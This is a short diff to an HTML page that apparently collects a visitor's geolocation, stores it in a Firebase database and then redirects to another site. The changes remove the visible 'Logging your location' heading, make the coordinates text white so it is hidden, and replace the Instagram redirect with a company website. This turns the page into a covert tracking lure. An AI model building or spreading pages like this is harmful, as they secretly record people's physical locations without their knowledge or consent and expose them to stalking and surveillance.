@@ -6,8 +6,8 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
 </head>
 <body>
-<h2>Logging your location...</h2>
-<div id="coords">Fetching location...</div>
+
+<div style="color: white;" id="coords">Fetching location...</div>
 
 <script>
   // ✅ Replace this with your actual Firebase config
@@ -38,10 +38,10 @@
   timestamp
 }).then(() => {
   // ✅ Instantly redirect
-  window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+  window.location.href = "https://www.parkonic.com/";
 }).catch((err) => {
   console.error("Logging failed", err);
-  window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+  window.location.href = "https://www.parkonic.com/";
 });
 
     },
